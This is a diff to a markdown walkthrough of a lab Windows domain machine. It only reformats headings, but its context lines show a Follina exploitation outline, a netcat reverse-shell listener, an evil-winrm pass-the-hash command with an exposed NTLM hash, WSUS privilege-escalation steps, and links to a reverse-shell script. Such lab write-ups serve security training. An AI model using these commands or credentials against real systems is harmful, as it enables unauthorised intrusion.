@@ -3,7 +3,7 @@ If Active Directory => Synchronize your NTP with the domain controller:
 ```bash
 nptdate 10.10.10.103
 ```
-# Content
+### Content
 
 - SMB Enumeration
 - Follina Exploitation
@@ -16,7 +16,7 @@ nptdate 10.10.10.103
 - Abusing WSUS Administrators Group
 - WSUS Exploitation - Creating a malicious patch for deployment (Privilege Escalation)
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -240,7 +240,7 @@ Host: 10.10.14.2
 Connection: Keep-Alive
 ```
 
-# Exploitation
+### Exploitation
 Searching for the vulnerabilities on the PDF (CVE-2022-30190) we find some references to the popular Follina exploit:
 ![[Pasted image 20230124191307.png]]
 After research a little bit about it, we identify a potential [Follina](https://github.com/chvancooten/follina.py)
@@ -326,7 +326,7 @@ zsh: suspended  nc -lvnp 1234
 ```
 5) Finally double click Enter and that will be it...
 
-# Client AD Pivoting
+### Client AD Pivoting
 Since we are inside another machine we need to move laterally to the DC or the real victim machine (10.10.11.175) for this we can abuse of BloodHound utility, to install please refer to [[Bloodhound Installation]] guide.
 
 What we need to perform on the victim machine is to first download the [Sharphound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) utility and upload it to the machine: ^8d2e14
@@ -448,7 +448,7 @@ evil-winrm -i 10.10.11.175 -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'
 *Evil-WinRM* PS C:\Users\sflowers\Documents>
 ```
 
-# Root privesc
+### Privilege Escalation
 If we execute a "whoami /groups" command we receive the following output:
 ![[Pasted image 20230125020305.png]]
 
@@ -497,17 +497,17 @@ Microsoft Windows [Version 10.0.17763.1432]
 C:\Windows\system32>
 ```
 
-# Credentials
+### Credentials
 ```bash
 HASH-NTLM: sflowers:1FCDB1F6015DCB318CC77BB2BDA14DB5
 ```
 
-# Notes
+### Notes
 
 - Bloodhound needs SharpHound .zip file to run, never forget to execute the .exe which is updated most than the .ps1
 - Follina is very easy to exploit but relies on the user interaction, as any client-side attack is difficult to get a user to click on a link but if we can accomplish it we can get a really easy shell.
 
-# Resources:
+### References
 
 [Follina](https://github.com/chvancooten/follina.py)
 [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
